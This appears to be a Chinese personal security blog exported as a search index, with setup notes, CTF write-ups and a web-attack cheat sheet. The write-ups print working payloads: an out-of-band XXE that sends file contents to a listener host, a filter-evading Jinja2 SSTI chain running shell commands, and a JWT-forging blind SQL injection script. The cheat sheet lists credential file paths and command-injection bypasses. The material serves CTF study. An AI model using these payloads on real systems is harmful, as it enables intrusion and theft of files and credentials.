{"pages":[{"title":"四大皆空","text":"","link":"/404.html"},{"title":"About Me","text":"Me爱是恒久忍耐~ 26 岁，是上班三年的穷屌丝。 成长 ing。但是我还是一枝花 爱好：唱歌、摸鱼~~ 喜欢：蜡笔小新、柯南 讨厌：无厘头的人 运动：乒乓球 🏓 篮球 目标：渗透大佬 || python || web全栈 || 人民讲师 梦想：没有梦想","link":"/about/index.html"},{"title":"About Site","text":"Blog拾光中。。。 小站总是写些技术性的文章，总显得有些许生硬了些。 生活的气息总不能缺少。以后还是想着有更多关于生活，关于思想，关于感悟的东西迸发出来。 凡有一个人的主张，得了赞和，是促其前进的，得了反对，是促其奋斗的，独有叫喊于生人中，而生人并无反应，既非赞同，也无反对，如置身毫无边际的荒原，无可措手的了，这是怎样的悲哀呵，我于是以我所感到者为寂寞。 ​ ——鲁迅《呐喊》","link":"/about/site.html"},{"title":"","text":"","link":"/archives/index.html"},{"title":"","text":"","link":"/categories/index.html"},{"title":"可爱的女孩子","text":"","link":"/girls/index.html"},{"title":"我的小伙伴们","text":"","link":"/links/index.html"},{"title":"","text":"","link":"/tags/index.html"}],"posts":[{"title":"ctf-wp-saining","text":"环境地址61.147.171.107:10081 61.147.171.107:10082 61.147.171.107:10083 10081 xml注入访问源代码分析，感觉应该的是个xml外部实体注入 先构造payload试一哈： &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;!DOCTYPE root [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> &lt;root>&amp;xxe;&lt;/root> 确实存在，但是有过滤 尝试使用参数型实体方式注入： vps构造 test.dtd &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt; &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.31.79:8888?p=%file;'&gt;&quot;&gt; 开启端口监听：nc -lvvp 8888 攻击payload: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://139.196.234.164:8899/test.dtd&quot;&gt; %remote;%int;%send; ]&gt; 成功返回加密字符串，解密后获取 修改test.dtd获取test.php源码 &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=test.php&quot;&gt; &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.31.79:8888?p=%file;'&gt;&quot;&gt; 发包获取到源码如下： &lt;?php error_reporting(0); function showAttrs($attrs) { $r = [&quot;&quot;]; foreach ($attrs as $k =&gt; $v) { array_push($r, $k . &quot;=\\&quot;&quot; . $v-&gt;textContent . &quot;\\&quot;&quot;); } return implode(&quot; &quot;, $r); } function showNode($n, $pre) { if ($n-&gt;hasChildNodes()) { echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&gt;\\n&quot;; foreach ($n-&gt;childNodes as $c) { show($c, $pre . &quot; &quot;); } echo $pre . &quot;&lt;/&quot; . $n-&gt;nodeName . &quot;&gt;\\n&quot;; } else { echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;/&gt;\\n&quot;; } } function show($n, $pre) { switch ($n-&gt;nodeType) { case XML_ELEMENT_NODE: showNode($n, $pre); break; case XML_TEXT_NODE: case XML_CDATA_SECTION_NODE: case XML_ENTITY_REF_NODE: echo $pre . $n-&gt;textContent . &quot;\\n&quot;; break; case XML_COMMENT_NODE: echo $pre . &quot;&lt;!--&quot; . $n-&gt;textContent . &quot;--&gt;\\n&quot;; break; case XML_DOCUMENT_NODE: foreach ($n-&gt;childNodes as $c) { show($c, $pre); } break; default: echo &quot;Nope&quot;; break; } } if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { $d = new DOMDocument(); $data = file_get_contents(&quot;php://input&quot;); if(preg_match('/file|rot13/i', $data)) { die('illegal!'); } $d-&gt;loadXML($data, LIBXML_BIGLINES | LIBXML_COMPACT | LIBXML_DTDVALID | LIBXML_NOBLANKS |LIBXML_NOERROR | LIBXML_NOWARNING | LIBXML_NOENT); if ($d-&gt;validate()) { show($d, &quot;&quot;); } else { echo &quot;è¿å¥½åä¸æ¯ä¸ªè§èçè¯­å¥å¦&quot;; } } else { echo (&quot;è¯·æ±æ¹å¼æè¯¯&quot;); } 看了一下源码没啥东西 应该不用源码审计，猜测flag可能存在路径下，修改test.dtd包含一下看看 &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt; &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.31.79:8888?p=%file;'&gt;&quot;&gt; 确实有值，解密后成功拿到flag ZmxhZ3tYUE9aVGQ2NkZhQU1zVXNUcng3QzJ2cURCVm1nRXFiYn0K flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}10082 ssti模板注入请求获取源码，分析源码，获得变量入口点，首先传参变量是name, 构造/?name={{4*4}} 呦西 ，确实有ssti！ 不过存在过滤，几乎把能过滤的东西都过滤了，过滤的死死滴 blackwords = ['class', 'attr', 'mro', 'base', 'request', 'session', 'add', 'chr', 'ord', 'redirect', 'url_for', 'config', 'builtins', 'get_flashed_messages', 'get', 'subclasses', 'form', 'cookies', 'headers', 'local', 'input', 'compile', 'os', 'flag', 'dir', 'eval', 'print', 'and','[', ']', '\\'', '\"', '{}', '\\\\', '#', '&lt;', '>', '&amp;', '/', '+'] 那就绕吧，怎么绕呢？ 这里可以利用的点就是使用jinja2自身的过滤器进行bypass {% set org = ({ }|select()|string()) %}{{org}} 编写获取对应字符串搜索脚本 #!/usr/local/env python3 # -*- coding:utf-8 -*- # author:greetdawn import requests url = \"http://61.147.171.107:10082/?name=\" payload = \"{{% set sstr = ((app.__doc__|string|list).pop({num})|string) %}}{{{{sstr}}}}\" for i in range(0, 300): r = requests.get(url + payload.format(num=i)) # print(r.text) if '/' in r.text: print(\"[+] paylaod: {}\".format(payload.format(num=i))) break else: print(\"search {}\".format(i)) 依次获取更多字符 {% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}} # _ {% set space = (({ }|select|string|list).pop(10)|string) %} # 空格 {% set left = ((app.__doc__|string|list).pop(171)|string) %} {{left}} # ( {% set right = ((app.__doc__|string|list).pop(182)|string) %} {{right}} # ) {% set yin = ((app.__doc__|string|list).pop(177)|string) %} # 单引号 ' {% set point = ((app.__doc__|string|list).pop(26)|string) %} {{point}} # . {% set but = dict(buil=aa,tins=dd)|join %} # builtins {% set imp = dict(imp=aa,ort=dd)|join %}{{imp}} # import {% set pon = dict(po=aa,pen=dd)|join %}{{pon}} # popen {% set os = dict(o=aa,s=dd)|join %}{{os}} # os {% set ca = dict(ca=aa,t=dd)|join %} # cat {% set flg = dict(fl=aa,ag=dd)|join %} # flag {% set ev = dict(ev=aa,al=dd)|join %} # eval {% set red = dict(re=aa,ad=dd)|join %} {{red}} # read {% set bul = xhx*2~but~xhx*2 %} # __builtins__ {% set zero = (self|int) %} # 0, 也可以使用lenght过滤器获取数字 {% set one = (zero**zero)|int %} # 1 {% set two = (zero-one-one)|abs %} # 2 {% set four = (two*two)|int %} # 4 {% set five = (two*two*two)-one-one-one %} # 5 {% set three = five-one-one %} # 3 {% set nine = (two*two*two*two-five-one-one) %} # 9 {% set seven = (zero-one-one-five)|abs %} # 7 {% set c = dict(c=aa)|reverse|first %} # 字符 c {% set bfh = self|string|urlencode|first %} # 百分号 % {% set bfhc = bfh~c %} # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接 {% set slas = bfhc%((four~seven)|int) %} # 使用%c构造斜杠 / 根据以上获取字符串进行拼接获取payload:``__import__(’os‘).popen(‘cat /flag’).read() http://61.147.171.107:10082/?name={% set zero = (self|int) %} {% set one = (zero**zero)|int %} {% set two = (zero-one-one)|abs %} {% set four = (two*two)|int %} {% set five = (two*two*two)-one-one-one %} {% set three = five-one-one %} {% set nine = (two*two*two*two-five-one-one) %} {% set seven = (zero-one-one-five)|abs %} {% set c = dict(c=aa)|reverse|first %} {% set bfh = self|string|urlencode|first %} {% set bfhc = bfh~c %} {% set slas = bfhc%((four~seven)|int) %} {% set space = (({ }|select|string|list).pop(10)|string) %} {% set yin = ((app.__doc__|string|list).pop(177)|string) %} {% set xhx = (({ }|select|string|list).pop(24)|string) %} {% set left = ((app.__doc__|string|list).pop(171)|string) %} {% set right = ((app.__doc__|string|list).pop(182)|string) %} {% set point = ((app.__doc__|string|list).pop(26)|string) %} {% set but = dict(buil=aa,tins=dd)|join %} {% set imp = dict(imp=aa,ort=dd)|join %} {% set pon = dict(po=aa,pen=dd)|join %} {% set exo = dict(o=aa,s=dd)|join %} {% set ca = dict(ca=aa,t=dd)|join %} {% set flg = dict(fl=aa,ag=dd)|join %} {% set ev = dict(ev=aa,al=dd)|join %} {% set red = dict(re=aa,ad=dd)|join %} {% set bul = xhx*2~but~xhx*2 %} {% set pld = xhx*2~imp~xhx*2~left~yin~exo~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %} {{pld}} 带入万能payload构造eval执行命令 {% for f,v in whoami.__init__.__globals__.items() %} {% if f == bul %} {% for a,b in v.items() %} {% if a == ev %} {{b(pld)}} {% endif %} {% endfor %} {% endif %} {% endfor %} flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}10083 文件包含请求看源码，典型的文件包含，传入变量file1和file2 payload： file1=php://filter/read=convert.base64-encode/resource=flag.php file2=data:text/plain,hello ctf 利用data协议传入原始文件流，利用php://filter协议包含flag.php文件源码 成功获取base64值解密得flag PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gZmxhZ3sxbmx1ZGVfYW5kX2cwVF8xVCF9 &lt;?php echo \"WRONG WAY!\"; // $flag = flag{1nlude_and_g0T_1T!} flag: flag{1nlude_and_g0T_1T!}","link":"/2022/02/15/ctf-wp-saining/"},{"title":"更换电脑之后博客迁移操作","text":"开始准备默认提前安装好git,nodejs 拷贝必要文件 _config.yml theme source scaffolds package.json .gitignore 安装必要环境npm install hexo-cli -g npm install 必要组件 sudo npm install hexo-deployer-git --save sudo npm install hexo-generator-feed --save sudo npm install hexo-generator-sitemap --save git部署将默认私钥添加至.ssh路径 git初始化一下即可","link":"/2020/08/10/config/change-compute-config/"},{"title":"mysql中常用的配置操作","text":"mysql中开启外联","link":"/2021/02/03/config/mysql-config/"},{"title":"picgo+gitee图床配置","text":"环境下载picgo下载链接 nodejs下载地址 提示:必须要配置安装完成nodejs后才可下载后续的插件 picgo插件安装 gitee仓库配置新建仓库 在仓库中新建一个文件img用于存放上传的图片。 获取码云的token 验证完码云的密码后，会显示出token。注意，这个token只会在这里显示一次。 保存好token，将在配置PicGo插件时使用。 配置插件 repo: gitee用户名/仓库名 branch: 分支。指定为主分支 token: 私人令牌。之前在码云上创建的令牌 path: 图片存放路径。创建仓库时，新建的文件夹名。 customPath：提交消息，这一项和下一项customURL都不用填。在提交到码云后，会显示提交消息，插件默认提交的是 Upload 图片名 by picGo - 时间","link":"/2021/08/10/config/picgo-gitee-config/"},{"title":"关于VMware磁盘镜像导入ESXi的方法","text":"多磁盘格式首先将多个磁盘进行合并处理，使用vmware自带的vmware-vdiskmanager.exe工具 \"D:\\InstallSoftware\\VMware\\VMware Workstation\\vmware-vdiskmanager.exe\" -r \"Windows Server 2008 R2 x64.vmdk\" -t 0 ATT01-win2008.vmdk 单磁盘单磁盘比较简单，直接找到虚拟机vmdk文件即可 ESXi操作首先创建一个对应镜像格式的虚拟机 创建成功后，删除该镜像的默认vmdk文件 打开ESXi的ssh，使用sftp工具连接上传镜像文件 上传路径/vmfs/volumes/datastore1/ 由于vmware的磁盘镜像格式和ESXi的有所不同，需要使用ESXi的vmkfstools工具进行转换 转换生成的镜像名称和刚刚创建的虚拟机镜像名保持一致 vmkfstools -i ATT01-win2008.vmdk ATT01-win2008R2.vmdk 将转换后的磁盘移动到对应虚拟机的目录下 也可以先创建虚拟机，再上传磁盘到虚拟机目录下，再对其进行转换即可。","link":"/2021/12/27/config/%E5%85%B3%E4%BA%8EVMware%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5ESXi%E7%9A%84%E6%96%B9%E6%B3%95/"},{"title":"SCTF2021","text":"团队在SCTF中喜获两枚flag webloginme下载源码发现是go语言的web框架题 其实对go一点不熟，之前也没有学过，很难受，那就现场学习一下吧 首先需要本地登录 但是源码要求x-forwarded-for和x-client-ip均为空 搜gin模块ClientIP()的使用方法发现默认方法有[X-Forwarded-For, X-Real-Ip] 那直接构造请求包参数X-Real-Ip:127.0.0.1成功登录 分析route.go源码中Login方法逻辑保证传入id参数为0，可以取到admin的信息 func Login(c *gin.Context) { idString, flag := c.GetQuery(\"id\") if !flag { idString = \"1\" } id, err := strconv.Atoi(idString) if err != nil { id = 1 } TargetUser := structs.Admin for _, user := range structs.Users { if user.Id == id { TargetUser = user } } age := TargetUser.Age if age == \"\" { age, flag = c.GetQuery(\"age\") if !flag { age = \"forever 18 (Tell me the age)\" } } 这里存在一个模板渲染函数，渲染参数为age支持用户自定义输入 if err != nil { c.AbortWithError(500, err) } html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age) if err != nil { c.AbortWithError(500, err) } tmpl, err := template.New(&quot;admin_index&quot;).Parse(html) if err != nil { c.AbortWithError(500, err) } tmpl.Execute(c.Writer, TargetUser) } 百度一下go模板渲染方式，其实跟python的ssti很像，于是构造age={{.}}直接取出flag 最终payload:?id=0&amp;age={{.}} MISCThis_is_A_tree下载附件发现是二叉树 整理得到 左子树 右子树 按根节点-左节点-右节点的顺序遍历，并在又子树yEhO处分割，得到两断base64加密密文 Q2hpbmVzZSB0cmFkaXRpb25hbCBjdWx0dXJlIGlzIGJyb2FkIGFuZCBwcm9mb3VuZCEgU28gSSBXYW50IEdpdmUgWW91IE15IEZsYWcgQnV0IFlvdSBOZWVkIERlY29kZSBJdC5FbmpveSBUaGUgRmxhZyEh OuW4iCDlhZEg5aSNIOaNnyDlt70g6ZyHIOaZiyDlp6Qg5aSn6L+HIOiuvCDlmazll5Eg6ZyHIOaBkiDoioIg6LGrIA== 解密得到：Chinese traditional culture is broad and profound! So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫 按伏羲六十四卦解密 exp s='师兑复损巽震晋姤大过讼噬嗑震恒节豫' dic={'坤': '000000', '剥': '000001', '比': '000010', '观': '000011', '豫': '000100', '晋': '000101', '萃': '000110', '否': '000111', '谦': '001000', '艮': '001001', '蹇': '001010', '渐': '001011', '小过': '001100', '旅': '001101', '咸': '001110', '遁': '001111', '师': '010000', '蒙': '010001', '坎': '010010', '涣': '010011', '解': '010100', '未济': '010101', '困': '010110', '讼': '010111', '升': '011000', '蛊': '011001', '井': '011010', '巽': '011011', '恒': '011100', '鼎': '011101', '大过': '011110', '姤': '011111', '复': '100000', '颐': '100001', '屯': '100010', '益': '100011', '震': '100100', '噬嗑': '100101', '随': '100110', '无妄': '100111', '明夷': '101000', '贲': '101001', '既济': '101010', '家人': '101011', '丰': '101100', '离': '101101', '革': '101110', '同人': '101111', '临': '110000', '损': '110001', '节': '110010', '中孚': '110011', '归妹': '110100', '睽': '110101', '兑': '110110', '履': '110111', '泰': '111000', '大畜': '111001', '需': '111010', '小畜': '111011', '大壮': '111100', '大有': '111101', '夬': '111110', '乾': '111111'} li=[] k=0 for i in range(len(s)): if k ==1: k=0 continue try: li.append(dic[s[i]]) except: t='' t=t+s[i]+s[i+1] li.append(dic[t]) k=1 ss=''.join(li) print(ss) enc='' for i in range(0,len(ss),8): enc+=chr(eval('0b'+ss[i:i+8])) print(enc) 得到flag Ch1nA_yyds!","link":"/2021/12/25/ctf/SCTF2021/"},{"title":"2020年网鼎杯初赛玄武组部分writeup","text":"2020年网鼎杯初赛玄武组部分writeup jwt注入、java逆向、杂项、签到 题目序号 16 题目名称 js_on操作内容：访问页面尝试弱口令进行登录 测试出 账号admin 密码admin可以登录进页面发现有个key值 推测与全国信安比赛CISCN2018的web题easyweb 类似 是利用JWT伪造cookie 访问https://jwt.io网站 将admin页面的token值进行带入 右边回显完信息后 然后将 key值复制进VERIFY SIGNATURE 代码框中 同时在 user 变量中 构造注入语句 测试注入语句为 admin’and (select counet(*) from admin)&gt;0，猜测是否有admin表 （将伪造的token替换到admin 页面抓的包中）,发现回显 get out heacker 证明思路正确，接下来就是构造注入payload 尝试了各种注入语句发现不管怎么构造 只要出现单引号和select&amp;union就会被检测过滤。猜测是否是读取文件，用+替换空格，构造payload为， admin’and+substr(load_file(‘/flag’),1,1)=1#，尝试判断可能存在的字符串 写py脚本 实现批量猜解。 #!/usr/local/env python import requests import jwt url = \"http://61c689d7c58b46fbaa40097072b1e5b90859d0e18970409f.cloudgame2.ichunqiu.com/index.php\" chars = '{}-abcdefghigklmnopqrstuvwxyz0123456789' for i in range(1,45): for j in range(len(chars)): header = { \"alg\": \"HS256\", \"typ\": \"JWT\" } payload = { \"user\": \"admin'and+substr(load_file('/flag'),{num},1)='{ch}'#\".format(num=i,ch=chars[j]), \"news\": \"key:xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6\" } encode_jwt = jwt.encode(payload, 'xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6', algorithm='HS256', headers = header) cookies_data0 = { '__jsluid_h':'7624a174d2449ec0266b2b5b4b93cb80', 'token': encode_jwt.decode() } headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' } # print(encode_jwt.decode()) r = requests.get(url, headers = headers, cookies = cookies_data0) if \"key:xRt\" in r.text: print(chars[j]) else: pass 题目序号 3 题目名称 ransom操作内容：分析日志，按事件id，先过滤事件id528，找到所有登陆失败的情况。 找到攻击者id为192.200.200.40 根据提示：rdp最后登录成功的情况。过滤关键词rdp，在结果中找到192.200.200.40的最后一次登录信息。 根据信息打开rdp.exe回答问题，得到flag 题目序号 1 题目名称 签到操作内容：打游戏通关至p14，输入本队token，输入f12，查看元素得到flag 题目序号 15 题目名称 java操作内容：把apk用jeb打开. 确定MainActivity, 找到判断的函数. 分析funca函数 重点分析标的1,2,3函数. 方法3内容简单,就是base64的加密. 方法2为输入的字节数组,分别进行异或22和代码中给出的整形数组. 方法1为加密.但是在开始的使用会在输入的字符串后面追加未知长度的内容. 加密的时候替换了字符串中的字符 根据方法1~3写出逆函数, 打印出flag. Apk汇编重构如下： package org.nisodaisuki.ctf; import androidx.appcompat.app.AppCompatActivity; import java.security.Key; import android.os.Bundle; import android.util.Base64; import android.util.Log; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.d(\"ccccc\", \"------------------------------------------\"); String ddd = \"VsBDJCvuhD65/+sL+Hlf587nWuIa2MPcqZaq7GMVWI0Vx8l9R42PXWbhCRftoFB3\"; byte[] encode = Base64.decode(ddd.getBytes(), Base64.NO_WRAP); int[] s = new int[] { 0xD6, 0x90, 0xE9, 0xFE, 204, 0xE1, 61, 0xB7, 22, 0xB6, 43, 103, 20, 0xC2, 40, 0xFB, 44, 5, 43, 103, 0x9A, 0x76, 42, 190, 4, 0xC3, 43, 103, 170, 68, 19, 38, 73, 0x86, 43, 103, 0x99, 0x9C, 66, 80, 0xF4, 0x91, 80, 103, 0xEF, 0x98, 0x7A, 98, 50, 0xD6 } ; int len = 0; System.out.println(\"length---------------\" + encode.length);; while (len &lt; encode.length) { encode[len] = (byte)(encode[len] ^ s[len]); len++; } len = 0; while (len &lt; encode.length) { encode[len] = (byte)(encode[len] ^ 22); len++; } /* * public static final int ENCRYPT_MODE = 1; public static final int DECRYPT_MODE = 2; */ try { String sss = \"aes_check_key!@#\"; sss = sss.replace(\"e\", \"o\"); SecretKeySpec v5_2 = new SecretKeySpec(sss.getBytes(), \"AES\"); Cipher v6 = Cipher.getInstance(\"AES/ECB/NoPadding\"); v6.init(Cipher.DECRYPT_MODE, ((Key)v5_2)); encode = v6.doFinal(encode); } catch(Exception v5_1) { System.out.println(\"Exception v5_1---------------\" + encode.length); } System.out.println(\"length---------------\" + encode.length); int dfdsf = encode.length; for (int i = 0; i &lt; dfdsf; i++) { byte[] tt = new byte[dfdsf-i]; System.arraycopy(encode, 0, tt, 0, dfdsf-i); String dessssstring = new String(tt); // System.out.println(\"-----------------------\"+dessssstring); } } }","link":"/2020/05/22/ctf/ctf-2020wdcup-xuanwuteam/"},{"title":"CTF知识点总结","text":"常见CTF知识点的总结 信息收集常见的信息收集手段​ web扫描器：御剑、awvs 收集站点目录，获取重要站点信息文件。如后台、爬虫文件。 ​ nmap扫描：站点服务器端口、服务开放情况、所用中间件的版本详情 ​ 做题技巧​ 源码分析，查看源码是否有什么可疑的注释信息。 ​ 扫描器收集信息。 ​ 访问可以文件或者页面。 ​ CMS站点常见cms存在的一些文件，安装完成后为及时删除，造成站点被篡改。 ​ 如：install/install.php data/install.lock ​ 弱口令爆破常见的：admin、admin123、admin123456、1q2w3e4r。。。 ​ 使用butpsuite抓包爆破。intruder ​ sql注入sql注入的产生原因：​ 由于服务器接收用户数据并且拼接了用户的可疑sql代码。并且没有进行严格的过滤，将sql语句带入查询。 了解其中的危害性：​ 数据库信息泄露，用户重要的饮食数据。 ​ 网页篡改 ​ 网站被挂马 ​ 数据库被恶意操作 ​ 服务器被远程控制 常见的注入类型：​ 寻找注入点：动态页面与数据库交互。 ​ 方法：单引号法，判断是否有错误返回and 1=1 和 and 1=2 ​ 基于时间类型的盲注：测试方法，查看页面返回延时 ​ 做题：首先基本的判断注入,执行注入语句，进行注入操作，可以手注，可自动化注入 ​ POST型注入 ​ sqlmap跑出注入点时，爆库、表、字段、内容的步骤​ python sqlmap.py -u “http://172.16.5.107/stage/5/get_info.php?title=xiaoshiniudao&amp;id=1&quot; ​ 爆库： –dbs ​ 爆表： -D databasename –tables ​ 爆字段： -D databasename -T tablename –columns ​ 爆字段的内容： -D databasename -T tablename -C “——，——” –dump ​ union联合查询猜解库，表，名，字段 1 union select table_name from information_schema.schemata 库 1 union select table_name from information_schema.tables where table_schema=’xxxxx’ 库中的表 1 union select column_name from information_schema.columns where table_schema=’xxxxx’ and table_name=’xxxx’ 1 union select xxxx from xxxx 常见查询函数 version() MySQL 版本 user() 数据库用户名 database() 数据库名 @@datadir 数据库路径 @@version_compile_os 操作系统版本 hex() 把十进制转为十六进制 concat() 连接字符串 ascii() ascii编码 length（) 获取长度 substring() mid（） 取出字符串 group_concat() 连接一个组的所有字符串 以逗号分隔每一条数据 updatexml()、extractvalue() 用于报错注入 sleep（） 休眠 xss 跨站脚本攻击（cross-site scripting）​ 出现于web应用程序的安全漏洞。对用户输入过滤不足。插入恶意脚本。 危害cookie劫持、会话劫持、钓鱼欺骗 攻击条件a) 需要向web页面注入恶意代码 b）这些恶意代码能够被浏览器成功执行 分类​ 反射型：也称非持久型、参数型跨站脚本 ​ 恶意代码没有保存在目标站点，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击。 ​ 存储型： ​ XSS存储型攻击，恶意代码被保存到目标网站的服务器中，这种攻 击具有较强的稳定性和持久性，比较常见场景是在博客，论坛等社交网 站上，但OA系统，和CRM系统上也能看到它身影，比如：某CRM系 统的客户投诉功能上存在XSS存储型漏洞，黑客提交了恶意攻击代码， 当系统管理员查看投诉信息时恶意代码执行，窃取了客户的资料，然而 管理员毫不知情，这就是典型的XSS存储型攻击。 DOM型： 文件包含原理代码通过php函数来包含其他php的代码文件，并且当成php代码来执行，使得代码重复利用，降低开发的开发成本。 常见文件包含函数include()、include_once()、require()、require_once() 漏洞产生原因文件包含函数加载的参数没有经过严格过滤活或者严格定义，可以被用户控制包含其他恶意文件，导致执行了非预期的代码。 本地文件包含漏洞​ a）无限制本地文件包含 ​ b) 常见的敏感信息路径 windows： c:\\boot.ini // 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件 c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码 c:\\ProgramFiles\\mysql\\my.ini // MySQL配置 c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码 c:\\windows\\php.ini // php 配置信息 Linux： /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 /var/log/ ​ c）session文件包含 ​ d) 有限制本地文件包含漏洞绕过 ​ %00截断 ​ 条件：magic_quotes_gpc = Off php版本&lt;5.3.4 远程文件包含支持的协议和封装协议 //官方文档 file:// — 访问本地文件系统 http:// — 访问 HTTP(s) 网址 ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流（I/O streams） zlib:// — 压缩流 data:// — 数据（RFC 2397） glob:// — 查找匹配的文件路径模式 phar:// — PHP 归档 ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — 音频流 expect:// — 处理交互式的流 ​ ​ 任意文件上传前端js上传检测绕过​ 判断方法：使用bp抓包，直接上传后缀为php的文件，发现bp没有抓到包，但是已经弹窗显示上传文件格式不允许。 ​ 绕过方法： ​ 1）上传合法后缀的文件。使用bp截包改后缀名。即可绕过。 ​ 2）审查元素，修改js验证代码的 ​ 3）删除对js验证脚本的调用 服务器端MIME类型检测绕过​ 检测原理：当用户上传文件至服务端时，服务端程序会获取上传文件的MIME类型 ​ 绕过方法:MIME类型在HTTP请求字段里的Content-type字段，修改该字段的值即可绕过 黑名单绕过​ 检测原理：服务器端根据一份后缀名的名单来判断是否允许当前文件上传到服务器，若在名单中，就禁止该文件上传 ​ 绕过方法： ​ 1）文件名大小写绕过。（pHP Asp） ​ 2）名单列表绕过 ​ 3）特殊文件名绕过。 windows可以自动修改。 但是linux|unix没有这个特性 1.jpg 1.jpg. 1.jpg.abc ​ 4）0x00截断绕过 ​ 5）.htaccess文件攻击 ​ 6）解析调用/漏洞绕过 白名单绕过服务端文件内容绕过web应用程序解析绕过​ 1）apache解析漏洞 ​ 解析：test.php.(任意不属于黑名单且也不属于Apache解析白名单的名称)，比如test.php.lala ​ 描述：一个文件名为test.x1.x2.x3的文件，apache会从x3的位置开始尝试解析，如果x3不属于apache能够解析的扩展名，那么apache会尝试去解析x2，直到能够解析到能够解析的为止，否则就会报错。 ​ 2）ISS解析漏洞 ​ 解析：test.asp/(任意文件名)|test.asp；(任意文件名) | (任意文件名)/(任意文件名).php ​ 描述：IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有”.asp;”会优先按asp来解析;IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php的方式去解析； ​ 3）nginx解析漏洞**** ​ 解析： (任意文件名)/(任意文件名).php | (任意文件名)%00.php ​ 描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。 命令执行常见shell拼接符（&amp;、&amp;&amp;、|、||）A&amp;B: 顺序执行多条命令，而不管命令是否执行成功 A&amp;&amp;B: 顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令 A|B: 管道命令，如：dir . /s/a | find /c &quot;.exe&quot; 表示：先执行 dir 命令，对其输出的结果执行后面的 find 命令 A||B: 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令 常见绕过方式空格绕过 $IFS $IFS$1 ${IFS} $IFS$9 &lt; 比如cat&lt;a.tct:表示cat a.txt &lt;> {cat,flag.php} //用逗号实现了空格功能，需要用{}括起来 %20 %09 绕过关键字 wh\\o\\ami //反斜线绕过 who\"a\"mi //双引号绕过 whoa'm'i //单引号绕过 whoam``i //反引号绕过 echo d2hvYW1p|base64 -d|sh //base64绕过,其中d2hvYW1p是whoami的base64编码 echo d2hvYW1p|base64 -d|bash//base64绕过,其中d2hvYW1p是whoami的base64编码 `echo d2hvYW1p|base64 -d` //将其base64解码,然后用反引号来执行命令 echo 77686F616D69 | xxd -r -p | bash //hex绕过,其中77686F616D69是whoami的hex编码 //$*和$@，$x(x 代表 1-9),${x}(x>=10) :比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下: wh$1oami who$@ami whoa$*mi 任意字符插入执行（可绕过命令和文件名） cat /f`who`la`ks`g 反斜杠之间的字符会作为命令执行 w`\\f1hgb`ho`\\f1hgb`am`\\f1hgb`i //这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行 wh$(f1hgb)oa$(f1hgb)mi //和上面的差不多,都说执行和拼接 只可绕过文件名 cat fl[abc]g.php //匹配[abc]中的任何一个 cat f[a-z]ag.txt //匹配a-z范围的任何字符 cat fla* //用*匹配任意 a=f;d=ag;c=l;cat $a$c$d.php 表示cat flag.php //内联执行 文件名绕过 利用正则:比如要读取etc/passwd cat /???/?????? cat /???/pass* 